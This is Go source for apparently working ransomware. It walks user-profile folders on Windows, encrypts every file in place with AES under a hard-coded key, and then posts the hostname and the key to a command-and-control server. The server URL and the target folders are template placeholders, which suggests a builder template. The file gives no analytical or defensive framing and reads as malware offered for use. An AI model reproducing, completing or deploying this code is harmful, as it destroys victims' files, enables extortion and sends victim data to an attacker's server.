package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"net/url"
)

const C2ServerUrl = "__C2_SERVER_URL__"
const TargetDirsString = "__TARGET_DIRECTORIES__"

func encryptData(plainText []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}
	return gcm.Seal(nonce, nonce, plainText, nil), nil
}

func processFiles() {
	key := []byte("0123456789abcdef0123456789abcdef") 
	userProfile := os.Getenv("USERPROFILE")
	if userProfile == "" {
		userProfile = "C:\\Users\\Default"
	}

	targetDirectories := strings.Split(TargetDirsString, ",")

	for _, dirName := range targetDirectories {
		dirName = strings.TrimSpace(dirName)
		if dirName == "" {
			continue
		}

		targetDir := filepath.Join(userProfile, dirName)
		if _, err := os.Stat(targetDir); err == nil {
			filepath.Walk(targetDir, func(path string, info os.FileInfo, err error) error {
				if err != nil || info.IsDir() {
					return nil
				}
				
				data, err := os.ReadFile(path)
				if err != nil {
					return nil
				}

				encrypted, err := encryptData(data, key)
				if err == nil {
					os.WriteFile(path, encrypted, 0644)
				}
				return nil
			})
		}
	}
}

func reportBack() {
	hostname, err := os.Hostname()
	if err != nil {
		hostname = "Unknown-PC"
	}

	data := url.Values{}
	data.Set("hostname", hostname)
	data.Set("ip_address", "192.168.1.100")
	data.Set("os", "Windows")
	data.Set("encryption_key", "0123456789abcdef0123456789abcdef")
	data.Set("encryption_type", "AES")
	data.Set("status", "encrypted")

	resp, err := http.PostForm(C2ServerUrl, data)
	if err == nil {
		resp.Body.Close()
	}
}

func main() {
	processFiles()
	reportBack()
}